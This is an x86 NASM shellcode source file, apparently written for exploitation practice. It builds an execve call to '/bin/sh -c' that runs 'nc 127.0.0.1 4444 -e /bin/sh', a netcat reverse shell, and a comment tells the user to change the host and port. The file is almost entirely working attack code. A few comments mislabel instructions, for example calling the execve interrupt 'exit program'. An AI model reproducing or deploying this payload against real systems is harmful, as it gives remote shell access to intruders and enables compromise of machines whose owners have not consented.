;
;  payload.nasm
;  GateCode
;
;  Created by The Gate Group on 2020.
;  Copyright © 2020 The Gate Group. All rights reserved.
;

; int execve(const char *filename, char *const argv[], char *const envp[]);
;
; ebx   ->      const char *filename
; ecx   ->      char *const argv[]
; edx   ->      char *const envp[]

section .text
global _start

; entry point

_start:
        xor     eax,    eax     ; zero-initialize eax
        xor     edx,    edx     ; zero-initialize eax
        mov     al,     0xb     ; int execve(const char *filename, char *const argv[], char *const envp[]);

        ; first command block

        push    edx             ; save NULL value to edx
        push    word    0x632d  ; -c value
        mov     edi,    esp     ; save -c value to edi
        
        ; second command block

        push    edx             ; save NULL value to edx
        push    0x6873          ; sh value
        push    0x2f6e6962      ; /bin value
        push    0x2f2f2f2f      ; //// value
        mov     ebx,    esp     ; save /////bin/sh value to ebx
        
        push    edx             ; save NULL value to edx

        jmp short cmd_data      ; jump to take the command

; args point

args:
        push    edi             ; push -c value
        push    ebx             ; push /////bin/sh value
        mov     ecx,    esp     ; save /////bin/sh -c cmd NULL
        int     0x80            ; exit program

; cmd_data point

cmd_data:
        call args               ; call args
        cmd: db         "nc 127.0.0.1 4444 -e /bin/sh"
        ; set cmd and change host and port

; really I wrote this for an hour, before success I got a lot of Segmentation fault, Illegal instruction and Bus error messages.
; but strace helped me to solve all problems. Use strace!
